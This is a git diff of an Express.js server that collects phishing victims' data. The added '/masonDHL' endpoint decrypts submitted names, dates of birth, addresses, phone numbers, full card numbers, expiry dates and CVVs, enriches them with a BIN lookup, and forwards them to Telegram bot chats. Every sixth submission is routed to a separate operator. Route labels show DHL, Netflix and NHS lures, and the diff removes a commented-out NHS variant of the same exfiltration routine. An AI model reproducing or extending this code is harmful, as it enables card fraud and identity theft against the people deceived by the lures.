@@ -23,6 +23,67 @@ app.get('/getips', (req, res) => {
     })
 });
 
+//DHL
+//DHL
+//DHL
+
+let mason = 0;
+
+app.options('/masonDHL', cors())
+
+app.post('/masonDHL', (req, res) => {
+    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
+    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
+    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
+    postcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
+    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
+    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
+    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
+    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
+    cccvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
+    userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, '402312').toString(CryptoJS.enc.Utf8);
+    userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, '402312').toString(CryptoJS.enc.Utf8);
+    bin = req.body.bin;
+
+    if (bin.length === 7) {
+        formatBin = bin.replace(/ /g, '');
+        if (formatBin.length === 7) {
+            formatBin = bin.slice(0, -1);
+        }
+        bin = formatBin;
+    }
+    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
+        if (!resp.data.bank) {
+            bankName = ""
+        } else {
+            bankName = resp.data.bank.name;
+        }
+    }).then(function () {
+        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
+        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+        if (mason == 6) {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            );
+            mason = 0;
+        } else {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=DHLMason:\n${originalText}`
+            );
+            axios.post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=DHL:\n${originalText}`
+            );
+            mason += 1
+        }
+
+        res.send("Update Completed");
+    })
+});
+
+//NETLIX
+//NETLIX
+//NETLIX
+
 app.options('/fpaysNetflix', cors())
 
 app.post('/fpaysNetflix', (req, res) => {
@@ -913,58 +974,6 @@ app.post('/littlewaynesjobs', (req, res) => {
         res.send("Update Completed");
     })
 });
-
-app.options('/sendClearStore', cors())
-
-// app.post('/sendClearStore',(req, res) => {
-//     firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
-//     lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
-//     dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
-//     address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
-//     pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
-//     telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
-//     email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
-//     ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
-//     ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
-//     cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
-//     userAgent = req.body.userAgent;
-//     ip = req.body.ip;
-//     bin = req.body.bin;
-
-//     if (bin.length === 7) {
-//         formatBin = bin.replace(/ /g, '');
-//         if (formatBin.length === 7) {
-//             formatBin = bin.slice(0, -1);
-//         }
-//         bin = formatBin;
-//     }
-//     axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
-//         if (!resp.data.bank) {
-//             bankName = ""
-//         } else {
-//             bankName = resp.data.bank.name;
-//         }
-//     }).then(function () {
-//         binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
-//         var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-//         if (clearstore == 7) {
-//             axios.post(
-//                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-//             );
-//             clearstore = 0;
-//         } else {
-//             axios.post(
-//                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSBali:\n${originalText}`
-//             );
-//             axios.post(
-//                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5357978103&text=NHS:\n${originalText}`
-//             );
-//             clearstore += 1;
-//         }
-
-//         res.send("Update Completed");
-//     })
-// });
 
 app.options('/sendKelvFriendRes', cors())
 
